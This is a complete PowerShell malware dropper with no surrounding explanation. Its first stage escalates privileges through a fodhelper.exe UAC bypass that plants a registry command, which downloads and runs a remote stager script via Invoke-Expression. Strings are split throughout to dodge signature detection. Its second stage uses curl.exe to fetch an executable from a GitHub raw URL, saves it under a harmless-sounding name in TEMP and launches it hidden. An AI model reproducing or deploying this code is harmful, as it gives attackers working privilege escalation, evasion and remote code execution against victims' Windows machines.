# --- STAGE 1: PRIVILEGE CHECK & OBFUSCATED UAC BYPASS ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-Not $isAdmin) {
    try {
        # Obfuscate strings to evade signature detection
        $p1 = "HKCU:\Software\Classes"
        $p2 = "\ms-settings\Shell\Open\command"
        $regPath = $p1 + $p2
        
        $c1 = "powershell -ExecutionPolicy Bypass -Command `"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Rajesh141414/loverboy/main/"
        $c2 = "stager_evasive.ps1')`""
        $command = $c1 + $c2

        New-Item $regPath -Force | Out-Null
        Set-ItemProperty $regPath -Name "(Default)" -Value $command -Force | Out-Null
        
        # Obfuscate the process name
        $proc1 = "fod"
        $proc2 = "helper"
        Start-Process ($proc1 + $proc2 + ".exe") -WindowStyle Hidden
        
        Start-Sleep -Seconds 5
        Remove-Item $regPath -Recurse -Force | Out-Null
    } catch {
        exit
    }
    exit
}

# --- STAGE 2: PAYLOAD DEPLOYMENT (ADMIN-ONLY & STEALTHY) ---
try {
    # Use a less suspicious downloader (curl.exe) and obfuscate the payload URL and output path
    $urlPart1 = "https://raw.githubusercontent.com/Rajesh141414/loverboy/main/"
    $urlPart2 = "DiagTrackRunner.exe"
    $payloadUrl = $urlPart1 + $urlPart2
    
    $out1 = $env:TEMP
    $out2 = "\diagrunner.exe" # Change the name to be less suspicious
    $outputPath = $out1 + $out2
    
    # Use curl, which is a legitimate Windows binary, to download the file. Less suspicious than PowerShell's WebClient.
    curl.exe -L -s -o $outputPath $payloadUrl
    
    # Execute the downloaded payload silently
    Start-Process -FilePath $outputPath -WindowStyle Hidden
} catch {
    exit
}